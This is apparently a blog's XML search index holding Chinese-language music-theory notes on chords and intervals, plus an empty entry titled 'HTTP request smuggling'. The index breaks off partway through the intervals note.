<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>&#39;http请求走私&#39;</title>
    <link href="/2024/11/24/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <url>/2024/11/24/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>乐理笔记07-和弦</title>
    <link href="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/"/>
    <url>/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="和弦"><a href="#和弦" class="headerlink" title="和弦"></a>和弦</h2><h3 id="和弦-1"><a href="#和弦-1" class="headerlink" title="和弦"></a>和弦</h3><p>三个音或者三个以上的音构成的集体称为和弦。在特定风格或条件下，有些和弦会规律性地省略自己内部的一些音，导致这些和弦看上去只有1或2个音。</p><h3 id="和声"><a href="#和声" class="headerlink" title="和声"></a>和声</h3><p>和声指不同的和弦组合、连接、运用方式、细节处理等。强调不同和弦连接而形成的整体。</p><h3 id="三和弦"><a href="#三和弦" class="headerlink" title="三和弦"></a>三和弦</h3><p>三个音，按照三度叠置的关系形成的和弦称为三和弦。三个音由低到高分别为根音、三音与五音。根音到三音，三音到五音的音程皆为三度。</p><h4 id="大三和弦与小三和弦"><a href="#大三和弦与小三和弦" class="headerlink" title="大三和弦与小三和弦"></a>大三和弦与小三和弦</h4><p>根音到三音是大三度，三音到五音是小三度，称为大三和弦（大+小）。听起来通常感觉明亮、温馨。<br>根音到三音是小三度，三音到五音是大三度，称为小三和弦（小+大）。听起来通常感觉暗淡、忧伤。<br>大三和弦与小三和弦的根音到五音是纯五度，是协和音程，听起来顺耳。</p><h4 id="增三和弦与减三和弦"><a href="#增三和弦与减三和弦" class="headerlink" title="增三和弦与减三和弦"></a>增三和弦与减三和弦</h4><p>根音到三音是大三度，三音到五音是大三度，称为增三和弦（大+大）。<br>根音到三音是小三度，三音到五音是小三度，称为减三和弦（小+小）。<br>增三和弦与减三和弦的根音到五音是增五度&#x2F;减五度，是不协和音程，听起来紧张、压抑。<br>增三和弦是需要扩张的紧张、压抑，后面通常接大六度；减三和弦是需要收缩的紧张、压抑，后面通常接纯四度或大三度；</p><h4 id="三和弦的转位"><a href="#三和弦的转位" class="headerlink" title="三和弦的转位"></a>三和弦的转位</h4><p>三和弦的第一转位，指将原位的根音提高八度，三音与五音保持不变。所得和弦低音（三音）与根音的距离是六度，故又称为六和弦。<br>三和弦的第二转位，指将原位的根音与三音提高八度，五音保持不变。所得和弦低音（五音）与根音的距离是四度，低音（五音）与三音的距离是六度，故又称为四六和弦。<br>注意转位后音高最低的音（低音）不是根音。<br>如图为大三和弦的转位，小三和弦、增三和弦、减三和弦同理，其转位后的名称前缀与原位三和弦的前缀相同。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/1_%E4%B8%89%E5%92%8C%E5%BC%A6%E8%BD%AC%E4%BD%8D.png" alt="img"></p><h3 id="七和弦"><a href="#七和弦" class="headerlink" title="七和弦"></a>七和弦</h3><p>四个音，按照三度叠置的关系形成的和弦称为七和弦。四个音由低到高分别为根音、三音、五音、七音。根音到三音，三音到五音，五音到七音的音程皆为三度。</p><h4 id="七和弦的命名规则"><a href="#七和弦的命名规则" class="headerlink" title="七和弦的命名规则"></a>七和弦的命名规则</h4><p>七和弦名字前有两个前缀，第一个前缀与其根音、三音、五音形成的三和弦前缀相同，第二个前缀与其根音与七音形成的音程前缀相同。<br>如C4、E4、G4、B4构成的七和弦，其根三五音为CEG，是大三和弦；根音与七音是大七度。分别取两者的前缀，得到七和弦的名称为“大大七和弦”（有两个“大”的情况通常会省略一个，称其为“大七和弦”）。<br>如B4、D5、F5、A5构成的七和弦，其根三五音是减三和弦；根音与七音是小七度。分别取两者的前缀，得到七和弦的名称为“减小七和弦”。</p><h4 id="常用七和弦及其简称"><a href="#常用七和弦及其简称" class="headerlink" title="常用七和弦及其简称"></a>常用七和弦及其简称</h4><p>常用的七和弦一共有7种，如下表所示：</p><p>表1 常用七和弦及其简称</p><table><thead><tr><th align="center">全称</th><th align="center">简称&#x2F;别称</th><th align="center">举例</th></tr></thead><tbody><tr><td align="center">大大七和弦</td><td align="center">大七和弦</td><td align="center">C4、E4、G4、B4</td></tr><tr><td align="center">大小七和弦</td><td align="center">属七和弦</td><td align="center">G4、B4、D5、F5</td></tr><tr><td align="center">小大七和弦</td><td align="center"></td><td align="center">D4、F4、A4、C5♯</td></tr><tr><td align="center">小小七和弦</td><td align="center">小七和弦</td><td align="center">E4、G4、B4、D5</td></tr><tr><td align="center">减小七和弦</td><td align="center">半减七和弦 小七降五和弦</td><td align="center">B3、D4、F4、A4</td></tr><tr><td align="center">减减七和弦</td><td align="center">减七和弦</td><td align="center">B3、D4、F4、A4♭</td></tr><tr><td align="center">增大七和弦</td><td align="center">半增七和弦 大七升五和弦</td><td align="center">F4、A4、C5♯、E5</td></tr></tbody></table><p>这里减小七和弦又称“半减七和弦”，指的是相较于“减减七和弦”，减小七和弦只有一个减。半增七和弦同理。<br>这里减小七和弦又称“小七降五和弦”，是指将小七和弦的五音降低一个半音，就可以得到减小七和弦。增大七和弦同理，可以将大七和弦的五音升一个半音来得到，故可称为“大七升五和弦”。</p><h4 id="七和弦的转位"><a href="#七和弦的转位" class="headerlink" title="七和弦的转位"></a>七和弦的转位</h4><p>七和弦的转位根据低音与七音、根音的度数来命名。<br>七和弦的第一转位，指将原位的根音提高八度，三音、五音、七音保持不变。所得和弦低音（三音）与七音的距离是五度，低音与根音的距离是六度，故又称为五六和弦。<br>七和弦的第二转位，指将原位的根音与三音提高八度，五音、七音保持不变。所得和弦低音（五音）与七音的距离是三度，低音与根音的距离是四度，故又称为三四和弦。<br>七和弦的第三转位，指将原位的根音、三音、五音提高八度，七音保持不变。所得和弦低音（七音）与根音的距离是二度，故又称为二和弦。<br>如图为大七和弦的转位，与三和弦类似，七和弦的转位后的名称前缀与原位七和弦的前缀相同。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/2_%E4%B8%83%E5%92%8C%E5%BC%A6%E8%BD%AC%E4%BD%8D.png" alt="img"></p><h3 id="广义的和弦原位与转位、转位的意义"><a href="#广义的和弦原位与转位、转位的意义" class="headerlink" title="广义的和弦原位与转位、转位的意义"></a>广义的和弦原位与转位、转位的意义</h3><p>判断和弦的两条标准：①和弦的构成音；②低音。<br>如大三和弦的构成音为CEG，低音为C。只要满足这两个条件构成的和弦就是大三和弦。<strong>与构成音的数量、所处的组无关</strong>。C3E4G5、C4E4G4E5G5等都是大三和弦。<br>只要和弦的根音不是低音，转位构成音仍是原位的构成音，则都是（广义的）该和弦的转位。不局限于提高或降低八度。如大三和弦原位C4E4G4，可以转位为E4G4C6(C&#x2F;E)、G3C4E5(C&#x2F;G)等。</p><p>转位的意义：①使声部进行流畅；②构建低音线条。</p><h3 id="和弦的织体"><a href="#和弦的织体" class="headerlink" title="和弦的织体"></a>和弦的织体</h3><p>织体(texture)是一个抽象的概念，用于描述乐曲的状态、形态、造型、形式、神态、质感等，可以用来形容声部关系、节奏、和声、附调、配器等的相互关系。<br>和弦的织体表示和弦在纵横两个方向上的具体形态。常见的和弦织体有柱式织体、分解织体、混合织体等。<br><img src="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/3_%E7%BB%87%E4%BD%93.png" alt="img"></p><h3 id="和弦固定标记法"><a href="#和弦固定标记法" class="headerlink" title="和弦固定标记法"></a>和弦固定标记法</h3><h4 id="三和弦的标记"><a href="#三和弦的标记" class="headerlink" title="三和弦的标记"></a>三和弦的标记</h4><p>表2 常用三和弦及其标记</p><table><thead><tr><th align="center">全称</th><th align="center">标记</th></tr></thead><tbody><tr><td align="center">大三和弦</td><td align="center">XMajor(Xmajor) XMaj(Xmaj) XM X</td></tr><tr><td align="center">小三和弦</td><td align="center">Xminor Xmin Xm X-</td></tr><tr><td align="center">增三和弦</td><td align="center">Xaugmented Xaug X+</td></tr><tr><td align="center">减三和弦</td><td align="center">Xdiminished Xdim X°</td></tr></tbody></table><h4 id="七和弦的标记"><a href="#七和弦的标记" class="headerlink" title="七和弦的标记"></a>七和弦的标记</h4><p>表3 常用七和弦及其标记</p><table><thead><tr><th align="center">全称</th><th align="center">简称&#x2F;别称</th><th align="center">标记</th></tr></thead><tbody><tr><td align="center">大大七和弦</td><td align="center">大七和弦</td><td align="center">XMajor7(Xmajor7) XMaj7(Xmaj7) XM7 XΔ7</td></tr><tr><td align="center">大小七和弦</td><td align="center">属七和弦</td><td align="center">Xdominant7 Xdom7 X7</td></tr><tr><td align="center">小大七和弦</td><td align="center"></td><td align="center">XminorMajor7 XminMaj7 XmMaj7 XmM7 X-M7 X-Δ7</td></tr><tr><td align="center">小小七和弦</td><td align="center">小七和弦</td><td align="center">Xminor7 Xmin7 Xm7 X-7</td></tr><tr><td align="center">减小七和弦</td><td align="center">半减七和弦 小七降五和弦</td><td align="center">Xdim(m7) X°(m7) Xhalf-dim7 XØ7 Xm7(♭5) Xm7-5</td></tr><tr><td align="center">减减七和弦</td><td align="center">减七和弦</td><td align="center">Xdiminished7 Xdim7 X°7</td></tr><tr><td align="center">增大七和弦</td><td align="center">半增七和弦 大七升五和弦</td><td align="center">Xaug(maj7) X+(maj7) X+Δ7 XM7+5 XM7♯5 XΔ7+5 XΔ7♯5</td></tr></tbody></table><p>注意这里“减”前缀的标记不是“-”，而是“°”，“小”前缀的标记是“-”，这里容易产生混淆。</p><h4 id="斜杠和弦"><a href="#斜杠和弦" class="headerlink" title="斜杠和弦"></a>斜杠和弦</h4><p>斜杠和弦（又称slash和弦、分数和弦、分割和弦）可以用于表示含有转位的和弦。其表示方法为“X&#x2F;Y”，其中X为原位和弦标记，Y为低音。<br>如“C&#x2F;G”表示的就是低音为G的C大三和弦（四六和弦），是三和弦的第二转位，根音与三音皆提高八度。<br>再如“F♯Δ7&#x2F;C♯”表示低音为C♯的F♯大七和弦（大三四和弦），是大七和弦的第二转位，根音与三音皆提高八度。<br>再如“Bm7-5&#x2F;A”表示低音为A的B减小七和弦（减小二和弦），是减小七和弦的第三转位，根音、三音、五音皆提高八度。</p><p>斜杠和弦亦可用于再原和弦基础上加一个不在此和弦内的音。<br>如“Fm&#x2F;G”中Fm为F小三和弦（构成音F、A♭、C），G表示以G为低音。该斜杠和弦表示同时奏G、F、A♭、C四个音（如G3、F4、A4♭、C5）。</p><h4 id="九音、十一音、十三音"><a href="#九音、十一音、十三音" class="headerlink" title="九音、十一音、十三音"></a>九音、十一音、十三音</h4><p>九和弦有五个音，在七和弦的基础上增加一个九音；十一和弦有六个音，在九和弦的基础上增加一个十一音；十三和弦有七个音，在九和弦的基础上增加一个十三音。九和弦、十一和弦、十三和弦举例如下图所示：<img src="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/4_%E4%B9%9D%E5%8D%81%E4%B8%80%E5%8D%81%E4%B8%89%E5%92%8C%E5%BC%A6.png" alt="img">九和弦、十一和弦、十三和弦的标记遵循以下规则：<br>①若标记中的9（或11、13）没有升降号，则该和弦根音与九音（或十一音、十三音）的音程为大九度（或纯十一度、大十三度）。<br>如Fm7(11)表示的小七和弦由F、A♭、C、E♭构成，要求根音与十一音的音程为纯十一度，则十一音应为B♭。<br>②在实际乐谱中，并不要求根音与九音（或十一音、十三音）的音程必须为大九度（或纯十一度、大十三度）。只要求和弦构成音正确。<br>如D7(11)表示大小七和弦加一个与根音距离为纯十一度的十一音，其构成音为“D、F♯、A、C、G”。在实际乐谱中，这五个音可以是D4、F4♯、A4、C5、G5，也可以是D4、G4、F4♯、A4、C5（将G5移动到G4），虽然此时根音与十一音的音程是四度，但是其构成音仍是D7(11)的构成音，因此仍可用D7(11)表示。<strong>依据为“判断和弦的两条标准”。</strong><br>③标记直接后接9、11、13时，需要包含其下方所有三度叠加音。<br>如CM11的构成音为“C、E、G、B、D、F”，这里既有十一音，也有九音和七音。<br>如果想表示七和弦加十一音，则应记为CM7(11)，11要外加一个括号，其构成音为“C、E、G、B、F”。<br>如果想表示七和弦加九音与十三音，则应记为CM7(9,13)，9与13外加一个括号，其构成音为“C、E、G、B、D、A”。<br>如果想表示三和弦加一个十一音，则应记为Cadd11，其构成音为“C、E、G、F”。 ④和弦构成音过多时，一般优先省略五音。（去掉五音对听觉的影响最小）<br>⑤标记中的9、11、13可以加升降号。如Fm7(♯11)表示小七和弦加音程为增十一度的十一音，即构成音为“F、A♭、C、E♭、B”。<br>“♭5 ♯5 ♭9 9 ♯9 11 ♯11 ♭13 13”统称为延伸音(Tension音)，这些音的加入，会增加和弦的不稳定性，增加和弦的张力。<br>注意这里没有♭11与♯13，因为大小七和弦（属七和弦)的♭11音等同于其3音，♯13音等同于其7音，这使得♭11与♯13变得没有意义。<br>⑥大小七和弦可以使用⑤中的所有Tension音，其他结构的七和弦只能使用其中的一部分。</p><h4 id="加音和弦"><a href="#加音和弦" class="headerlink" title="加音和弦"></a>加音和弦</h4><p>加音和弦格式为XaddY，表示在原X和弦基础上加上一个Y音。在这里Y可以为9、11、13，此时加音与根音距离为大九度、纯十一度、大十三度。<br>如Cadd9表示在C大三和弦基础上加一个大九度音，其构成音有“C、E、G、D”。</p><p><img src="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/5_%E5%8A%A0%E9%9F%B3%E5%92%8C%E5%BC%A6.png" alt="img"></p><p>在实际乐谱中，并不要求根音与九音的音程必为九度。如上图所示，Cadd9可以为“C4、D4、E4、G4”，此时根音与九音的音程是二度。因此Xadd9也可记作Xadd2（不常用记法）。<br>同理Xadd11亦可记作Xadd4。由于其所加的纯十一度音容易产生不协和的冲突而导致三音模糊，因此该加音和弦很少使用。<br>Xadd13亦可记作Xadd6（常用记法），指在X和弦基础上加大十三度音（大六度音）。Xadd6又可进一步简记为X6，称为六和弦，。而三和弦的第一转位也称为六和弦，因此六和弦又两种意义，需要结合具体的构成音加以区分。<br>Xadd6add9指在X和弦基础上加大六度与大九度音，可进一步简记为X69，称为六九和弦。</p><p>同样的构成音及低音可能有不同的和弦名字，如Fadd6的构成音为F、A、C、D，低音为F，而这也是Dm7&#x2F;F的构成音及低音。但两者的侧重点不一样，在不同的音乐语境下有不同的含义。Fadd6侧重于F大三和弦，在此基础上加入大六度音；Dm7&#x2F;F侧重于D小七和弦，在此基础上进行第一转位得到低音为F的五六和弦。</p><h4 id="挂留和弦"><a href="#挂留和弦" class="headerlink" title="挂留和弦"></a>挂留和弦</h4><p>挂留和弦(Suspended和弦、sus和弦)来源于“延留音”或“延留音和弦”。即前一个和弦的某个音X的时值被延长，继续保持在下一个和弦中，导致下一个和弦的音Y被挤掉，推迟了音Y开始发音的时间（也有可能音Y不再发音）。<img src="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/6_%E6%8C%82%E7%95%99%E5%92%8C%E5%BC%A6.png" alt="img"></p><p>挂留和弦的举例如上图所示，这里C大三和弦中原本的E4音（三音）被前面的G属七和弦的F4（纯四度音）代替，而E4则推迟半拍才发出。纯四度音挤压掉三音，因此该和弦亦可称为Csus4。<br>“挂留和弦”最常见的有两种形式，纯四度音挤压掉三音称为sus4，大二度音挤压掉三音称为sus2。（sus和弦中没有三音）<br>如Csus4的构成音是CFG，就是将三音E替换为纯四度音F；Csus2的构成音是CDG，就是将三音E替换为大二度音D。</p><h4 id="省略音和弦"><a href="#省略音和弦" class="headerlink" title="省略音和弦"></a>省略音和弦</h4><p>省略音和弦(omit和弦、no和弦)指省略某个和弦的音。如Fm7omit5（或Fm7no5）指省略Fm7和弦（构成音F、A♭、C、E♭）的五音C，得到和弦构成音F、A♭、E♭。<br>Comit3（或Cno3）指省略C大三和弦的三音E，得到和弦构成音C、G。省略了三音的和弦，模糊了和弦的明暗色彩感。由于该和弦只由根音与五音构成，因此又可简记为C5，称为五和弦。<br>五和弦也可称作power chord（强力和弦、重力和弦），常出现在朋克、摇滚、金属等风格中。</p><h3 id="和弦功能与级数标记法"><a href="#和弦功能与级数标记法" class="headerlink" title="和弦功能与级数标记法"></a>和弦功能与级数标记法</h3><p><img src="https://renahah.github.io/%E9%9F%B3%E4%B9%90/%E4%B9%90%E7%90%86/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/7_%E5%8A%9F%E8%83%BD%E7%BA%A7%E6%95%B0.png" alt="img">对音符与和弦的功能与级数标记法如上图所示，其中音符的级数标记法指的是将大调中的七个音依次标罗马数字I到VII。并将七个音依次命名为主音、上主音、中音、下属音、属音、下中音、导音。<br>将这七个音做为根音，向上叠加两个三度得如上图所示的三和弦（需要使用大调内的音），可以发现这里的根音I、IV、V形成的是大三和弦，分别记为I（主和弦）、IV（下属和弦）、V（属和弦）；根音II、III、VI形成的是小三和弦，分别记为ii（二级和弦）、iii（三级和弦）、vi（六级和弦）；根音VII形成的是减三和弦，记为vii°（导和弦)。<strong>上述规律适用于所有的大调。</strong></p><p>和弦同样可以使用阿拉伯数字标记，如上图所示。</p><p>功能标记法源自西方功能和声体系理论，使用三种功能记号对和弦进行标记，分别为T（主功能、Tonica）、D（属功能、Dominant）、S（下属功能、Subdominant）。在和声中主功能代表“稳定”，属功能与下属功能代表“紧张”。音乐里和声的底层逻辑，就是从“稳定”到“紧张”再到“稳定”再到“紧张”……通过循环保持音乐的推进。显然主和弦、下属和弦、属和弦分别可以记为T、S、D。其余和弦的标记取决于其体现的功能，如二级和弦具有下属功能，可标记为Sii；三级和弦既有一部分属功能，又有一部分主功能，因此标记为DTiii。全部标记可见上图。<br>属七和弦原意为“调式中的五级属功能七和弦”，如C大调中的G7便是这种含义下的属七和弦。而这个和弦恰恰是大小七和弦，因此最终泛指“大小七和弦”。</p><p>七和弦的级数标记法为级数右下角标7，如C大调的G属七和弦(G7)可标记为V7V7。<br>转位和弦通过级数右侧数字体现和弦结构。如C大调C大三和弦第一转位(C&#x2F;E)可标记为I6I6，三和弦第一转位又称为六和弦，这里右下角的6体现该和弦根音与三音的距离是六度。再如C大调E小三和弦第二转位(Em&#x2F;B)可标记为iii64iii46，三和弦第二转位又称为四六和弦，这里右下角的4与右上角6体现该和弦低音与根音的距离是四度，低音与三音的距离是六度。</p><h3 id="和声模板"><a href="#和声模板" class="headerlink" title="和声模板"></a>和声模板</h3><p>和声模板指一些常见的和弦走向套路，如4536251、15634125、6415、1645等。<br>使用和声模板需要注意以下几点：</p><ul><li>几乎所有模板都通过首调方式提示某个音的和弦，可以先使用C调进行创作，然后根据实际需要移调。如1645对应C大调C-Am-F-G。</li><li>所有模板均采用44拍，且每个和弦占据一个小节，收尾的和弦可以长一点，尽量把整体补成4个或8个小节。如4536251对应C大调F-G-Em-Am-Dm-G-C，前面六个和弦各占一个小节，最后一个C和弦占两个小节。</li><li>不局限于原位三和弦，可以尝试七、九、转位、add、sus等和弦。</li><li>织体上可以多做变化。</li><li>有些模板中的数字可能强调的是低音进行，而不是某级和弦。如17654325这里的7通常指的是“低音为7的属和弦”而非七级和弦。</li><li>多看谱，多分析，扩充自己的模板库。</li></ul>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钢琴</tag>
      
      <tag>乐理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>乐理笔记06-音程</title>
    <link href="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B006-%E9%9F%B3%E7%A8%8B/"/>
    <url>/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B006-%E9%9F%B3%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="音程"><a href="#音程" class="headerlink" title="音程"></a>音程</h2><h3 id="音程的概念"><a href="#音程的概念" class="headerlink" title="音程的概念"></a>音程的概念</h3><p>音程，即音与音的音高距离，如半音、全音（见“乐理笔记01-基础知识”）都是音程。</p><h3 id="度数"><a href="#度数" class="headerlink" title="度数"></a>度数</h3><p>两个音，忽略音名升降号（忽略钢琴黑键），只看音名的字母（只看钢琴白键），从低音到高音数有几个字母，就称几度。<br>如E4到A4经过了E4,F4,G4,A4四个字母，就称E4到A4有四度；<br>再如E4♭到A4♯，去掉升降号为E4与A4，仍然经过E4,F4,G4,A4四个字母，故E4♭到A4♯也是四度。<br>（这里F4到G4，G4到A4间有黑键F4♯与G4♯，但是要忽略黑键，因此F4♯与G4♯不计入度数）</p><h3 id="根音与冠音"><a href="#根音与冠音" class="headerlink" title="根音与冠音"></a>根音与冠音</h3><p>两个音中的低音是根音，高音是冠音。如E4与A4中的E4是根音，A4是冠音。</p><h3 id="音数"><a href="#音数" class="headerlink" title="音数"></a>音数</h3><p>表示两个音之间有多少个全音与半音。一个全音的音数为1，一个半音的音数为0.5，两个音的音数等于其间隔的全音数x1+半音数x0.5。<br>换一种说法，音数等于两个音之间的键数距离x0.5，这里的键包括白键与黑键。<br>如E4到A4间有一个半音(E4-&gt;F4)与两个全音(F4-&gt;G4,G4-&gt;A4)，故E4到A4的音数为2.5。<br>也可以数两个键的距离，E4-&gt;F4-&gt;F4♯-&gt;G4-&gt;G4♯-&gt;A4，显然E4到A4间是五个半音的距离，音数为2.5。</p><h3 id="小二度、大二度、小三度、大三度、小六度、大六度、小七度、大七度"><a href="#小二度、大二度、小三度、大三度、小六度、大六度、小七度、大七度" class="headerlink" title="小二度、大二度、小三度、大三度、小六度、大六度、小七度、大七度"></a>小二度、大二度、小三度、大三度、小六度、大六度、小七度、大七度</h3><p>音数为0.5的二度称为小二度。<br>如C4到D4♭，两个音是半音（音数为0.5），度数是二度，故为小二度。<br>小二度的音数必为0.5，但音数为0.5不一定为小二度。如C4到C4♯（不是二度、是增一度）。</p><p>音数为1的二度称为大二度。<br>如C4到D4，两个音是全音（音数为1），度数是二度，故为大二度。<br>大二度的音数必为1，但音数为1不一定为大二度。如B4♯到D4（不是二度、是减三度）。<br>小三度、大三度、小六度、大六度、小七度、大七度见表1。</p><h3 id="纯一度、纯八度、纯四度、纯五度"><a href="#纯一度、纯八度、纯四度、纯五度" class="headerlink" title="纯一度、纯八度、纯四度、纯五度"></a>纯一度、纯八度、纯四度、纯五度</h3><p>音数为0的一度称为纯一度（即两个相同的音）。如C4到C4。<br>一个音与其相邻组别的相同音名的距离是纯八度。如C4到C5。<br>纯四度是音数为2.5的四度，纯五度是音数为3.5的五度。<br>纯四度、纯五度见表1。</p><p>表1 音程总结表（一）</p><table><thead><tr><th align="center">名称</th><th align="center">定义</th><th align="center">举例</th></tr></thead><tbody><tr><td align="center">纯一度</td><td align="center">音数为0的一度</td><td align="center">C4到C4</td></tr><tr><td align="center">小二度</td><td align="center">音数为0.5的二度</td><td align="center">C4到D4♭</td></tr><tr><td align="center">大二度</td><td align="center">音数为1的二度</td><td align="center">C4到D4</td></tr><tr><td align="center">小三度</td><td align="center">音数为1.5的三度</td><td align="center">C4到E4♭</td></tr><tr><td align="center">大三度</td><td align="center">音数为2的三度</td><td align="center">C4到E4</td></tr><tr><td align="center">纯四度</td><td align="center">音数为2.5的四度</td><td align="center">C4到F4</td></tr><tr><td align="center">纯五度</td><td align="center">音数为3.5的五度</td><td align="center">C4到G4</td></tr><tr><td align="center">小六度</td><td align="center">音数为4的六度</td><td align="center">C4到A4♭</td></tr><tr><td align="center">大六度</td><td align="center">音数为4.5的六度</td><td align="center">C4到A4</td></tr><tr><td align="center">小七度</td><td align="center">音数为5的七度</td><td align="center">C4到B4♭</td></tr><tr><td align="center">大七度</td><td align="center">音数为5.5的七度</td><td align="center">C4到B4</td></tr><tr><td align="center">纯八度</td><td align="center">音数为6的八度</td><td align="center">C4到C5</td></tr></tbody></table><h3 id="增音程、减音程、倍增音程、倍减音程"><a href="#增音程、减音程、倍增音程、倍减音程" class="headerlink" title="增音程、减音程、倍增音程、倍减音程"></a>增音程、减音程、倍增音程、倍减音程</h3><h4 id="二、三、六、七"><a href="#二、三、六、七" class="headerlink" title="二、三、六、七"></a>二、三、六、七</h4><p>由表1可知音数为1.5的三度为小三度，在1.5的基础上减0.5，得到音数为1的三度，被称为减三度，如C4到E4♭♭。<br>在1的基础上再减0.5，得到音数为0.5的三度，被称为倍减三度，如C4♯到E4♭♭。<br>同理，音数为2的三度为大三度，在2的基础上加0.5，得到音数为2.5的三度，被称为增三度，如C4到E4♯。<br>在2.5的基础上再加0.5，得到音数为3的三度，被称为倍增三度，如C4到E𝄪。</p><h4 id="一、四、五、八"><a href="#一、四、五、八" class="headerlink" title="一、四、五、八"></a>一、四、五、八</h4><p>由表1可知音数为2.5的四度为纯四度，在2.5的基础上减0.5，得到音数为2的四度，被称为减四度，如C4到F4♭。<br>在2的基础上再减0.5，得到音数为1.5的四度，被称为倍减四度，如C4♯到F4♭♭。<br>同理，在2.5基础上加0.5，得到音数为3的四度，被称为增四度，如C4到F4♯。<br>在3的基础上再加0.5，得到音数为3.5的四度，被称为倍增四度，如C4到F4𝄪。</p><p>表2 音程总结表（二）</p><table><thead><tr><th>二三六七度</th><th>倍减X度</th><th>减X度</th><th>小X度</th><th>大X度</th><th>增X度</th><th>倍增X度</th></tr></thead><tbody><tr><td>音数</td><td>Y-1.5</td><td>Y-1</td><td>Y-0.5</td><td>Y</td><td>Y+0.5</td><td>Y+1</td></tr><tr><td>一四五八度</td><td></td><td>倍减X度</td><td>减X度</td><td>纯X度</td><td>增X度</td><td>倍增X度</td></tr><tr><td>音数</td><td></td><td>Y-1</td><td>Y-0.5</td><td>Y</td><td>Y+0.5</td><td>Y+1</td></tr></tbody></table><p>表3 音程总结表（三）</p><p><img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B006-%E9%9F%B3%E7%A8%8B/%E9%9F%B3%E7%A8%8B%E6%80%BB%E7%BB%93%E8%A1%A8%EF%BC%88%E4%B8%89%EF%BC%89.png" alt="img"></p><h3 id="等音程"><a href="#等音程" class="headerlink" title="等音程"></a>等音程</h3><p>音数相等的音程被称作等音程。如减三度、大二度、倍增一度互为等音程，它们的音数都是1。</p><h3 id="全音与半音"><a href="#全音与半音" class="headerlink" title="全音与半音"></a>全音与半音</h3><p>所有音数为0.5的音程（增一度、小二度、倍减三度）都是半音，所有音数为1的音程（减三度、大二度、倍增一度）都是全音。</p><h3 id="三全音"><a href="#三全音" class="headerlink" title="三全音"></a>三全音</h3><p>所有音数为3的音程（倍增三度、增四度、减五度、倍减六度）都是三全音，倍增与倍减的情况较为罕见，因此三全音通常指的是增四度或减五度。<br>三全音的听觉感受极不协和。</p><h3 id="识别音程的方法"><a href="#识别音程的方法" class="headerlink" title="识别音程的方法"></a>识别音程的方法</h3><h4 id="不含升降号的情况"><a href="#不含升降号的情况" class="headerlink" title="不含升降号的情况"></a>不含升降号的情况</h4><p>使用钢琴键可以更好的判断音程。钢琴键如下图所示，首先把钢琴中所有的EF、BC圈出，因为E到F、B到C是半音，它们中间没有黑键。<img src="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B006-%E9%9F%B3%E7%A8%8B/%E9%9F%B3%E7%A8%8B_%E9%92%A2%E7%90%B4%E9%94%AE.png" alt="img">一度音程（或八度音程）不用判断，肯定是纯一度（或纯八度），如C4到C4（或C4到C5）。<br>对于二度音程，如果是E-F、B-C，那就是小二度。其他情况（C-D、D-E、F-G、G-A、A-B）就是大二度。<br>对于三度音程，三度中包含EF或BC时音数会小一些，是小三度（D-F、E-G、A-C、B-D）。不包含EF或BC时音数会大一些，是大三度（C-E、F-A、G-B）。<br>对于四度音程，EF或BC中包含一个时是纯四度（C-F、D-G、E-A、G-C、A-D、B-E）。EF或BC都不包含时是增四度（F-B）。<br>对于五度音程，EF或BC中包含一个时是纯五度（C-G、D-A、E-B、F-C、G-D、A-E）。EF或BC都包含时是减五度（B-F)。<br>对于六度音程或七度音程，EF或BC中包含一个时是大六度&#x2F;七度，EF或BC都包含时是小六度&#x2F;七度。<br>不含升降号的情况下，识别音程的方法可总结为表4，如下所示：</p><p>表4 识别音程的方法（不含升降号）</p><table><thead><tr><th align="center">名称</th><th align="center">不包含</th><th align="center">包含一个</th><th align="center">包含两个</th></tr></thead><tbody><tr><td align="center">一度</td><td align="center">纯一度</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">二度</td><td align="center">大二度</td><td align="center">小二度</td><td align="center"></td></tr><tr><td align="center">三度</td><td align="center">大三度</td><td align="center">小三度</td><td align="center"></td></tr><tr><td align="center">四度</td><td align="center">增四度</td><td align="center">纯四度</td><td align="center"></td></tr><tr><td align="center">五度</td><td align="center"></td><td align="center">纯五度</td><td align="center">减五度</td></tr><tr><td align="center">六度</td><td align="center"></td><td align="center">大六度</td><td align="center">小六度</td></tr><tr><td align="center">七度</td><td align="center"></td><td align="center">大七度</td><td align="center">小七度</td></tr><tr><td align="center">八度</td><td align="center"></td><td align="center"></td><td align="center">纯八度</td></tr></tbody></table><h4 id="含升降号的情况"><a href="#含升降号的情况" 